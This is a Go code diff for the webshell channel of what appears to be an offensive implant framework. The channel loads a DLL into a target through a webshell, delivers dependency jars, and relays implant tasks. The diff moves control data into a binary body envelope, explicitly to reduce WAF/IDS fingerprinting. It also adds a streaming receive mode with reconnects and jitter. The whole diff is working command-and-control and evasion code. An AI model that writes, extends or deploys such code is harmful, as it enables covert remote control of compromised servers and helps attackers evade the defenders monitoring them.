@@ -8,11 +8,12 @@ import (
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/hex"
+	"encoding/json"
 	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
-	"strconv"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -24,20 +25,25 @@ import (
 )
 
 const (
-	httpTimeout      = 30 * time.Second
-	longPollTimeout  = 10 * time.Second
-	pollIdleInterval = 5 * time.Second
-	pollActiveInterval = 200 * time.Millisecond
-	jitterFactor     = 0.3
-	streamChanBuffer = 16
-	stageLoad        = "load"
-	stageInit        = "init"
-	stageSpite       = "spite"
-	stageStatus      = "status"
-	headerStage      = "X-Stage"
-	headerToken      = "X-Token"
-	headerSessionID  = "X-Session-ID"
-	headerPollTimeout = "X-Poll-Timeout"
+	httpTimeout          = 30 * time.Second
+	longPollTimeout      = 10 * time.Second
+	pollIdleInterval     = 5 * time.Second
+	pollActiveInterval   = 200 * time.Millisecond
+	jitterFactor         = 0.3
+	streamChanBuffer     = 16
+	streamReconnectDelay = 2 * time.Second
+	streamMaxReconnect   = 5
+	streamFrameMaxSize   = 10 * 1024 * 1024 // 10MB sanity limit
+)
+
+// Stage codes encoded in body envelope (no HTTP headers).
+const (
+	stageLoad   byte = 0x01
+	stageStatus byte = 0x02
+	stageInit   byte = 0x03
+	stageSpite  byte = 0x04
+	stageStream byte = 0x05
+	stageDeps   byte = 0x06
 )
 
 // ChannelIface abstracts the communication channel to the bridge DLL.
@@ -56,33 +62,43 @@ type ChannelIface interface {
 	IsClosed() bool
 }
 
-// Channel communicates with the bridge DLL through HTTP POST requests
-// to the webshell's X-Stage endpoints. The webshell calls DLL exports
-// (bridge_init, bridge_process) directly via function pointers — no TCP
-// port opened on the target, pure memory channel.
+// Channel communicates with the bridge DLL through HTTP POST requests.
+// All control information (stage, token, session ID) is encoded in a body
+// envelope prefix — no custom HTTP headers, reducing WAF/IDS fingerprint.
 //
-// Wire format: raw protobuf over HTTP body.
+// Body envelope format:
 //
-// For streaming tasks, a background poll goroutine periodically sends
-// empty requests to collect pending responses from the DLL.
+//	[1B stage][4B sessionID LE][1B token_len][token bytes][payload...]
+//
+// Payload is stage-specific:
+//   - load:   raw DLL bytes
+//   - status: empty
+//   - init:   empty
+//   - spite:  Spites protobuf
+//   - stream: empty
+//   - deps:   [1B dep_name_len][dep_name][jar bytes]
 type Channel struct {
-	webshellURL string
-	token       string
-	client      *http.Client
+	webshellURL  string
+	token        string
+	client       *http.Client
+	streamClient *http.Client // no timeout, for long-lived stream connection
 
 	sid    uint32
 	sidSet atomic.Bool
 	closed atomic.Bool
 	closeCh chan struct{}
 
+	lastStatus      *StatusResponse // populated by Connect()
+	streamSupported atomic.Bool
+
 	pendMu  sync.Mutex
 	pending map[uint32]chan *implantpb.Spite
 
-	pollCancel context.CancelFunc
+	recvCancel context.CancelFunc
 }
 
 // NewChannel creates a channel that communicates with the DLL through
-// the webshell's X-Stage: spite HTTP endpoint.
+// the webshell's body-envelope HTTP endpoint.
 func NewChannel(webshellURL, token string) *Channel {
 	return &Channel{
 		webshellURL: webshellURL,
@@ -93,9 +109,43 @@ func NewChannel(webshellURL, token string) *Channel {
 				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 			},
 		},
+		streamClient: &http.Client{
+			Timeout: 0,
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			},
+		},
 		pending: make(map[uint32]chan *implantpb.Spite),
 		closeCh: make(chan struct{}),
 	}
+}
+
+// StatusResponse is the structured status returned by the webshell.
+type StatusResponse struct {
+	Ready         bool   `json:"ready"`
+	Method        string `json:"method"`
+	DepsPresent   bool   `json:"deps_present"`
+	BridgeVersion string `json:"bridge_version"`
+}
+
+// buildEnvelope constructs the body prefix: [1B stage][4B sid LE][1B token_len][token].
+func (c *Channel) buildEnvelope(stage byte, payload []byte) []byte {
+	tok := computeToken(c.token)
+	tokLen := len(tok)
+	if tokLen > 255 {
+		tokLen = 255
+		tok = tok[:255]
+	}
+
+	// envelope header: 1 + 4 + 1 + tokLen
+	hdrLen := 6 + tokLen
+	buf := make([]byte, hdrLen+len(payload))
+	buf[0] = stage
+	binary.LittleEndian.PutUint32(buf[1:5], c.sid)
+	buf[5] = byte(tokLen)
+	copy(buf[6:6+tokLen], tok)
+	copy(buf[hdrLen:], payload)
+	return buf
 }
 
 // Connect verifies the webshell is reachable and the DLL is loaded.
@@ -104,9 +154,21 @@ func (c *Channel) Connect(ctx context.Context) error {
 	if err != nil {
 		return fmt.Errorf("connect: %w", err)
 	}
-	status := string(body)
-	if status != "LOADED" {
-		return fmt.Errorf("DLL not loaded (status: %s)", status)
+	text := strings.TrimSpace(string(body))
+
+	if len(text) > 0 && text[0] == '{' {
+		var sr StatusResponse
+		if jsonErr := json.Unmarshal([]byte(text), &sr); jsonErr == nil {
+			c.lastStatus = &sr
+			if !sr.Ready {
+				return fmt.Errorf("DLL not loaded (status: %s)", text)
+			}
+			return nil
+		}
+	}
+
+	if text != "LOADED" {
+		return fmt.Errorf("DLL not loaded (status: %s)", text)
 	}
 	return nil
 }
@@ -120,6 +182,26 @@ func (c *Channel) LoadDLL(ctx context.Context, dllBytes []byte) error {
 	return nil
 }
 
+// DeliverDep sends a dependency file (e.g., jna.jar) to the webshell.
+// Payload format for deps stage: [1B dep_name_len][dep_name][jar bytes].
+func (c *Channel) DeliverDep(ctx context.Context, depName string, data []byte) error {
+	nameBytes := []byte(depName)
+	if len(nameBytes) > 255 {
+		nameBytes = nameBytes[:255]
+	}
+	payload := make([]byte, 1+len(nameBytes)+len(data))
+	payload[0] = byte(len(nameBytes))
+	copy(payload[1:1+len(nameBytes)], nameBytes)
+	copy(payload[1+len(nameBytes):], data)
+
+	respBody, err := c.doRequest(ctx, stageDeps, payload)
+	if err != nil {
+		return fmt.Errorf("deliver dep %s: %w", depName, err)
+	}
+	logs.Log.Debugf("dep delivered: %s -> %s", depName, strings.TrimSpace(string(respBody)))
+	return nil
+}
+
 // Handshake calls bridge_init on the DLL via the webshell and returns
 // the Register message containing SysInfo and module list.
 func (c *Channel) Handshake() (*implantpb.Register, error) {
@@ -127,15 +209,11 @@ func (c *Channel) Handshake() (*implantpb.Register, error) {
 	if err != nil {
 		return nil, fmt.Errorf("handshake: %w", err)
 	}
-	if len(body) == 0 {
-		return nil, fmt.Errorf("empty handshake response")
-	}
-
-	// First 4 bytes: session ID (little-endian uint32), rest: Register protobuf
 	if len(body) < 4 {
 		return nil, fmt.Errorf("handshake response too short: %d bytes", len(body))
 	}
-	c.sid = uint32(body[0]) | uint32(body[1])<<8 | uint32(body[2])<<16 | uint32(body[3])<<24
+
+	c.sid = binary.LittleEndian.Uint32(body[:4])
 	c.sidSet.Store(true)
 
 	reg := &implantpb.Register{}
@@ -147,12 +225,106 @@ func (c *Channel) Handshake() (*implantpb.Register, error) {
 	return reg, nil
 }
 
-// StartRecvLoop starts a background polling goroutine that fetches pending
-// responses from the DLL for streaming tasks.
+// StartRecvLoop starts the background receive loop. It tries StreamHTTP first
+// (long-lived HTTP response stream) and falls back to polling if unsupported.
 func (c *Channel) StartRecvLoop() {
 	ctx, cancel := context.WithCancel(context.Background())
-	c.pollCancel = cancel
-	go c.pollLoop(ctx)
+	c.recvCancel = cancel
+	go c.recvLoop(ctx)
+}
+
+func (c *Channel) recvLoop(ctx context.Context) {
+	if c.tryStreamLoop(ctx) {
+		for attempt := 1; attempt <= streamMaxReconnect; attempt++ {
+			select {
+			case <-ctx.Done():
+				return
+			case <-c.closeCh:
+				return
+			case <-time.After(jitter(streamReconnectDelay)):
+			}
+			if c.tryStreamLoop(ctx) {
+				attempt = 0
+			}
+		}
+		logs.Log.Warn("stream reconnect exhausted, falling back to poll mode")
+	}
+	logs.Log.Debug("using poll mode for streaming tasks")
+	c.pollLoop(ctx)
+}
+
+// tryStreamLoop opens a long-lived POST with stage=stream envelope and reads
+// length-prefixed frames from the response body.
+func (c *Channel) tryStreamLoop(ctx context.Context) bool {
+	envelope := c.buildEnvelope(stageStream, nil)
+	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bytes.NewReader(envelope))
+	if err != nil {
+		logs.Log.Debugf("stream: request create error: %v", err)
+		return false
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	resp, err := c.streamClient.Do(req)
+	if err != nil {
+		logs.Log.Debugf("stream: connection error: %v", err)
+		return false
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		logs.Log.Debugf("stream: HTTP %d, not supported", resp.StatusCode)
+		return false
+	}
+
+	c.streamSupported.Store(true)
+	logs.Log.Important("stream mode active")
+
+	if err := c.readStreamFrames(ctx, resp.Body); err != nil {
+		if ctx.Err() != nil {
+			return true
+		}
+		logs.Log.Debugf("stream: read error: %v", err)
+	}
+	return true
+}
+
+func (c *Channel) readStreamFrames(ctx context.Context, r io.Reader) error {
+	for {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-c.closeCh:
+			return nil
+		default:
+		}
+
+		data, err := readFrame(r)
+		if err != nil {
+			return err
+		}
+		if len(data) > 0 {
+			c.dispatchResponse(data)
+		}
+	}
+}
+
+func readFrame(r io.Reader) ([]byte, error) {
+	var lenBuf [4]byte
+	if _, err := io.ReadFull(r, lenBuf[:]); err != nil {
+		return nil, err
+	}
+	frameLen := binary.BigEndian.Uint32(lenBuf[:])
+	if frameLen == 0 {
+		return nil, nil
+	}
+	if frameLen > streamFrameMaxSize {
+		return nil, fmt.Errorf("frame too large: %d bytes", frameLen)
+	}
+	payload := make([]byte, frameLen)
+	if _, err := io.ReadFull(r, payload); err != nil {
+		return nil, err
+	}
+	return payload, nil
 }
 
 func (c *Channel) pollLoop(ctx context.Context) {
@@ -162,7 +334,6 @@ func (c *Channel) pollLoop(ctx context.Context) {
 		c.pendMu.Unlock()
 
 		if !hasPending {
-			// No active streaming tasks — idle wait, no HTTP request.
 			select {
 			case <-ctx.Done():
 				return
@@ -173,13 +344,12 @@ func (c *Channel) pollLoop(ctx context.Context) {
 			continue
 		}
 
-		// Active streaming tasks — send long-poll request with timeout hint.
 		empty := &implantpb.Spites{}
 		data, err := proto.Marshal(empty)
 		if err != nil {
 			continue
 		}
-		respBody, err := c.doLongPollRequest(ctx, data)
+		respBody, err := c.doRequest(ctx, stageSpite, data)
 		if err != nil {
 			if ctx.Err() != nil {
 				return
@@ -197,7 +367,6 @@ func (c *Channel) pollLoop(ctx context.Context) {
 
 		hasData := c.dispatchResponse(respBody)
 
-		// Adaptive interval: fast when data is flowing, slow down when idle.
 		var interval time.Duration
 		if hasData {
 			interval = pollActiveInterval
@@ -212,48 +381,6 @@ func (c *Channel) pollLoop(ctx context.Context) {
 		case <-time.After(jitter(interval)):
 		}
 	}
-}
-
-// doLongPollRequest sends a spite-stage request with X-Poll-Timeout header,
-// telling the webshell to hold the connection until data is available or timeout.
-func (c *Channel) doLongPollRequest(ctx context.Context, body []byte) ([]byte, error) {
-	var bodyReader io.Reader
-	if body != nil {
-		bodyReader = bytes.NewReader(body)
-	}
-
-	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bodyReader)
-	if err != nil {
-		return nil, err
-	}
-	req.Header.Set(headerStage, stageSpite)
-	req.Header.Set(headerPollTimeout, strconv.Itoa(int(longPollTimeout.Seconds())))
-	if c.token != "" {
-		req.Header.Set(headerToken, tokenForHeader(c.token))
-	}
-	if c.sidSet.Load() {
-		req.Header.Set(headerSessionID, fmt.Sprintf("%d", c.sid))
-	}
-	req.Header.Set("Content-Type", "application/octet-stream")
-
-	resp, err := c.client.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		respBody, _ := io.ReadAll(resp.Body)
-		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
-	}
-
-	return io.ReadAll(resp.Body)
-}
-
-// jitter adds ±jitterFactor random variation to an interval.
-func jitter(d time.Duration) time.Duration {
-	delta := float64(d) * jitterFactor
-	return d + time.Duration(delta*(2*rand.Float64()-1))
 }
 
 // Forward sends a Spite and waits for a single response (unary request-response).
@@ -294,7 +421,6 @@ func (c *Channel) Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spi
 	return nil, fmt.Errorf("no response for task %d", taskID)
 }
 
-// OpenStream registers a persistent response channel for streaming tasks.
 func (c *Channel) OpenStream(taskID uint32) <-chan *implantpb.Spite {
 	ch := make(chan *implantpb.Spite, streamChanBuffer)
 	c.pendMu.Lock()
@@ -303,7 +429,6 @@ func (c *Channel) OpenStream(taskID uint32) <-chan *implantpb.Spite {
 	return ch
 }
 
-// SendSpite sends a spite to the DLL via the webshell.
 func (c *Channel) SendSpite(taskID uint32, spite *implantpb.Spite) error {
 	if c.closed.Load() {
 		return fmt.Errorf("channel closed")
@@ -344,7 +469,6 @@ func (c *Channel) SessionID() uint32 { return c.sid }
 
 func (c *Channel) IsClosed() bool { return c.closed.Load() }
 
-// WithSecure is a no-op. Use HTTPS for transport security.
 func (c *Channel) WithSecure(_ *clientpb.KeyPair) {}
 
 func (c *Channel) Close() error {
@@ -352,29 +476,20 @@ func (c *Channel) Close() error {
 		return nil
 	}
 	close(c.closeCh)
-	if c.pollCancel != nil {
-		c.pollCancel()
+	if c.recvCancel != nil {
+		c.recvCancel()
 	}
 	c.CloseAllStreams()
 	return nil
 }
 
-func (c *Channel) doRequest(ctx context.Context, stage string, body []byte) ([]byte, error) {
-	var bodyReader io.Reader
-	if body != nil {
-		bodyReader = bytes.NewReader(body)
-	}
+// doRequest sends a POST with body envelope, no custom headers.
+func (c *Channel) doRequest(ctx context.Context, stage byte, payload []byte) ([]byte, error) {
+	envelope := c.buildEnvelope(stage, payload)
 
-	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bodyReader)
+	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bytes.NewReader(envelope))
 	if err != nil {
 		return nil, err
-	}
-	req.Header.Set(headerStage, stage)
-	if c.token != "" {
-		req.Header.Set(headerToken, tokenForHeader(c.token))
-	}
-	if c.sidSet.Load() {
-		req.Header.Set(headerSessionID, fmt.Sprintf("%d", c.sid))
 	}
 	req.Header.Set("Content-Type", "application/octet-stream")
 
@@ -423,10 +538,19 @@ func (c *Channel) dispatchSpite(spite *implantpb.Spite) {
 	}
 }
 
-// tokenForHeader returns the token value to send in the X-Token header.
-// Short secrets (≤32 chars) are sent as-is (legacy static comparison on the webshell).
+// jitter adds ±jitterFactor random variation to an interval.
+func jitter(d time.Duration) time.Duration {
+	delta := float64(d) * jitterFactor
+	return d + time.Duration(delta*(2*rand.Float64()-1))
+}
+
+// computeToken returns the token value for the body envelope.
+// Short secrets (≤32 chars) are sent as-is.
 // Longer secrets use time-based HMAC-SHA256 that rotates every 30 seconds.
-func tokenForHeader(secret string) string {
+func computeToken(secret string) string {
+	if secret == "" {
+		return ""
+	}
 	if len(secret) <= 32 {
 		return secret
 	}
